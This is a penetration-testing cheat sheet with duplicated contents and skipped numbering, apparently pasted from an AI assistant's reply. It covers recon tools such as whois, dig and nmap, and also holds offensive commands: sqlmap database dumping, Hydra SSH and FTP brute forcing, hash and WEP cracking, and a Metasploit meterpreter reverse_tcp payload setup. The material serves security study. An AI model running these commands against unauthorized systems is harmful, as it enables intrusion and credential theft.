## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [**netcat (nc)**](#**netcat\(nc)**)
    - [**nmap**](#**nmap**)

## Table of Contents

    - [**netcat (nc)**](#**netcat\(nc)**)
    - [**nmap**](#**nmap**)

Certainly! I'll enhance your Linux Reconnaissance and Enumeration Cheat Sheet with more examples and specific details for each tool. Here we go:

1. **whois**
   - Get detailed information about a domain:
     ```bash
     whois example.com
     ```
   - Find out the registrar and expiration date of a domain:
     ```bash
     whois -H example.com | grep -E 'Registrar:|Expiration Date:'
     ```

2. **dig (Domain Information Groper)**
   - Retrieve A (address) records:
     ```bash
     dig example.com A
     ```
   - Query a specific DNS server:
     ```bash
     dig @8.8.8.8 example.com
     ```
   - Get reverse DNS lookup:
     ```bash
     dig -x 8.8.8.8
     ```

3. **nslookup**
   - Interactive mode for multiple queries:
     ```bash
     nslookup
     > set type=mx
     > example.com
     ```
   - Get SOA (Start of Authority) record:
     ```bash
     nslookup -type=soa example.com
     ```

4. **ping**
   - Ping continuously until stopped:
     ```bash
     ping example.com
     ```
   - Specify the number of echo requests:
     ```bash
     ping -c 5 example.com
     ```

5. **traceroute**
   - Trace route with a specific number of queries per hop:
     ```bash
     traceroute -q 1 example.com
     ```
   - Use ICMP ECHO instead of UDP datagrams:
     ```bash
     traceroute -I example.com
     ```

### **netcat (nc)**
   - Listen on a specific port:
     ```bash
     nc -l 1234
     ```
   - Create a simple TCP proxy:
     ```bash
     nc -l -p 1234 | nc target_host target_port
     ```

### **nmap**
   - *Scan a range of IPs*:
     ```bash
     nmap 192.168.1.1-10
     ```
   - *Detect OS and services*:
     ```bash
     nmap -A 192.168.1.1
     ```
   - Perform a stealthy scan:
     ```bash
     nmap -sS 192.168.1.1
     ```

8. **theHarvester**
   - Search across multiple sources:
     ```bash
     theHarvester -d example.com -b all
     ```
   - Specify the limit for search results:
     ```bash
     theHarvester -d example.com -l 500 -b google
     ```

9. **Nikto**
   - Scan for specific vulnerabilities:
     ```bash
     nikto -Plugins "xss;sql;traversal" -h example.com
     ```
   - Update before scanning:
     ```bash
     nikto -update
     nikto -h example.com
     ```

10. **SQLmap**
    - Test for specific SQL injection types:
      ```bash
      sqlmap -u "http://example.com/page.php?id=1" --risk=3 --level=5 --dbms=mysql
      ```
    - Dump database tables:
      ```bash
      sqlmap -u "http://example.com/page.php?id=1" --dump
      ```

11. **Metasploit Framework**
    - Search for a specific exploit:
      ```bash
      msfconsole
      search type:exploit platform:linux name:example
      ```
    - Set payload and options:
      ```bash
      use exploit/linux/http/example_exploit
      set PAYLOAD linux/x64/meterpreter/reverse_tcp
      set LHOST [Your IP]
      set RHOSTS example.com
      exploit
      ```

12. **Wireshark**
    - Open a specific capture file:
      ```bash
      wireshark -r file.cap
      ```
    - Start a new live capture on a specific interface:
      ```bash
      wireshark -i eth0
      ```

13. **tcpdump**
    - Capture and save packets to a file:
      ```bash
      tcpdump -i eth0 -w capture.pcap
      ```
    - Capture only TCP packets:
      ```bash
      tcpdump -i eth0 tcp
      ```

14. **Hydra**
    - Brute force SSH login:
      ```bash
      hydra -l user -P passlist.txt ssh://example.com
      ```
    - Attempt login with a list of usernames:
      ```bash
      hydra -L userlist.txt -p defaultpassword ftp://example.com
      ```

15. **John the Ripper**
    - Crack password hashes with a specific format:
      ```bash
      john --format=md5crypt hashfile
      ```
    - Show cracked passwords:
      ```bash
      john --show hashfile
      ```

16. **Aircrack-ng**
    - Crack WEP encryption:
      ```bash
      aircrack-ng -w wordlist.txt -b [BSSID] capture.cap
      ```
    - Monitor and capture packets:
      ```bash
      airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0
      ```

17. **OWASP ZAP**
    - Start ZAP in headless mode:
      ```bash
      zap.sh -daemon -port 8090
      ```
    - Perform an automated scan:
      ```bash
      zap-cli quick-scan --self-contained -s xss,sqli http://example.com
      ```

18. **Gobuster**
    - Brute force subdomains:
      ```bash
      gobuster dns -d example.com -w subdomains.txt
      ```
    - Use specific file extensions in search:
      ```bash
      gobuster dir -u http://example.com -w wordlist.txt -x .php,.html
      ```

19. **Enum4linux**
    - Get verbose output:
      ```bash
      enum4linux -v target_ip
      ```
    - Enumerate users:
      ```bash
      enum4linux -U target_ip
      ```

20. **DNSenum**
    - Perform standard record enumeration:
      ```bash
      dnsenum --enum example.com
      ```
    - Include reverse lookup of ranges and subdomain brute-forcing:
      ```bash
      dnsenum --enum -r -s 500 example.com
      ```
